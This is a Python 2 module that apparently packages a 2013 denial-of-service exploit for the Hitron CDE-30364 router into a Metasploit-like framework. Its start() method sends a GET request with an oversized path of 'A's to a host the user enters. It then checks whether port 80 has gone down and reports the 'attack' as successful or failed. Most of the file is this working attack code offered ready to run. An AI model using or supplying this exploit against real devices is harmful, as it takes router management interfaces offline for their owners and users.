def about():
	print '''!/usr/bin/python
-----------------------------------------------------------------------------------------
Description:
-----------------------------------------------------------------------------------------
Hitron Technologies CDE-30364 is a famous ONO Router.
The Hitron Technologies CDE-30364s web interface (listening on tcp/ip port 80), have a problem to insufficient bounds checking of data supplied in HTTP GET requests. The default ip adress of this adsl router, used for management purpose, is 192.168.1.1.
Send Request
Check 80 port
	'''


def auto_help(name,rank,description):
	stbl = "  " + name + " "*(13-len(name)+4) + rank + " "*(8-len(rank)+4) + description
	return stbl

def auto_targ(targetlist):
	print "Vulnrable Applications (cdeDoS)"
	print
	print "  ID	   Device"
	print "  --	   ------"
	for _ in targetlist:
		print "  "+_+" "*(9-len(_))+targetlist[_]
	print

try:
	if desc == "get-id":
		print auto_help("cdeDoS","Normal","Description")
except:
	pass

def auto_info(name,module,plat,priv,lic,rank,release="N/A",by="N/A"):
	print
	print "Publisher Information for cdeDoS"
	print
	print "	   Name:","cdeDoS"
	print "	 Module:",module
	print "   Platform:","Python"
	print " Privileged:","No"
	print "	License:","None"
	print "	   Rank:",rank
	print "  Disclosed:",release

def auto_opt(name,cset,req,description):
	stbl = "  " + name + " "*(9-len(name)) + cset + " "*(15-len(cset)+2) + req + " "*(8-len(req)+2) + description
	print stbl

class cdeDoS(object):
	def start(self):
		#!/usr/bin/python
		
		#-----------------------------------------------------------------------------------------
		#Description:
		#-----------------------------------------------------------------------------------------
		#Hitron Technologies CDE-30364 is a famous ONO Router.
		 
		#The Hitron Technologies CDE-30364's web interface (listening on tcp/ip port 80), have a problem to insufficient bounds checking of data supplied in HTTP GET requests. The default ip adress of this adsl router, used for management purpose, is 192.168.1.1.
		 
		import httplib
		import socket
		import time
		import sys
		 
		print "#"*36
		print "# Exploit Title: Router ONO Hitron CDE-30364 - Denial Of Service (80 port)"
		print "# Date: 8-10-2013"
		print "# Exploit Author: Matias Mingorance Svensson - matias.ms[at]owasp.org"
		print "# Vendor Homepage: http://www.ono.es/clientes/te-ayudamos/dudas/internet/equipos/hitron/hitron-cde-30364/"
		print "# Tested on: Hitron Technologies CDE-30364"
		print "# Version HW: 1A"
		print "# Version SW: 3.1.0.8-ONO"
		print "#"*36
		 
		#Send Request
		print "Sending the request to router ONO Hitron CDE-30364...\n"
		connct = httplib.HTTPConnection(raw_input("Host: "),80)
		connct.request("GET", "AAAAAAAAAA"*10001)
		connct.close()
		
		#Check 80 port
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		socket.setdefaulttimeout(4)
		time.sleep(5)
		try:
		 s.connect((raw_input("Host: "), 80))
		 s.shutdown(2)
		 print "Attack Fail!\n"
		except:
		 print "Attack Successful! The router administration page is down!\n"
		 print ""

def show_opt():
	print
	print "Module Options (cdeDoS)"
	print
	print "  Name	 Current Setting  Required  Description"
	print "  ----	 ---------------  --------  -----------"
	print "Raw Input Arguments"
	print 

try:
	if desc == "get-opt":
		show_opt()
except:
	pass

try:
	if desc == "proc":
		try:
			program = cdeDoS()
			program.start()
		except Exception as e:
			print e
			print "Options Still Unset"
			time.sleep(0.3)
			show_opt()
except:
	pass
